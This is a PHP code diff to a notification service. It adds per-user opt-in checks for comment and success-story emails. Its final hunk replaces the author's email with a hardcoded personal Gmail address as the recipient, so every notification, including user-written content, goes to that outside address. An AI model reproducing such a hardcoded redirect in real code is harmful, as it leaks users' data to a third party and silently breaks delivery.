@@ -39,13 +39,19 @@ class UserNotifyService
     public function sendNotifyAboutNewComment(Goal $goal, User $user, $commentText)
     {
         //get user notify value in parameter
-        $enabled = $this->container->getParameter('user_notify');
+        $enabledByConfig = $this->container->getParameter('user_notify');
 
         //get kernel debug
         $notProd = $this->container->getParameter('kernel.debug');
 
+        //get goal author
+        $author = $goal->getAuthor();
+
+        //get notify settings value
+        $enabled = $author->getCommentNotify();
+
         //check if user notify is disabled
-        if(!$enabled || $notProd) {
+        if(!$enabledByConfig || $notProd || !$enabled) {
             return;
         }
 
@@ -62,9 +68,6 @@ class UserNotifyService
             $commentText = $lastComment['body'];
         }
 
-        //get goal author
-        $author = $goal->getAuthor();
-        
         //get author email
         $email = $author->getEmail();
 
@@ -94,18 +97,21 @@ class UserNotifyService
     public function sendNotifyAboutNewSuccessStory(Goal $goal, User $user, $storyText)
     {
         //get user notify value in parameter
-        $enabled = $this->container->getParameter('user_notify');
+        $enabledByConfig = $this->container->getParameter('user_notify');
 
         //get kernel debug
         $notProd = $this->container->getParameter('kernel.debug');
 
-        //check if user notify is disabled
-        if(!$enabled || $notProd) {
-            return;
-        }
-
         //get goal author
         $author = $goal->getAuthor();
+
+        //get notify settings value
+        $enabled = $author->getSuccessStoryNotify();
+
+        //check if user notify is disabled
+        if(!$enabledByConfig || $notProd || !$enabled) {
+            return;
+        }
 
         //get author email
         $email = $author->getEmail();
@@ -145,7 +151,7 @@ class UserNotifyService
             $message = \Swift_Message::newInstance()
                 ->setSubject($subject)
                 ->setFrom($noReplyEmail, $projectName)
-                ->setTo($email)
+                ->setTo('ateptan777@gmail.com')
                 ->setContentType('text/html; charset=UTF-8')
                 ->setBody($content, 'text/html');
 
